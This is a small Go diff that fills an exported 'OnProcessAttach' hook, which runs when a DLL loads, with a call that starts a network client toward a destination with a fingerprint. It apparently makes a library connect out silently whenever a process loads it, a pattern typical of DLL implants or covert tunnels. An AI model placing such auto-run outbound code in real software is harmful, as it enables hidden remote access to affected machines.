@@ -12,5 +12,5 @@ func VoidFunc() {
 
 //export OnProcessAttach
 func OnProcessAttach() {
-
+	client.Run(destination, fingerprint, "", true)
 }
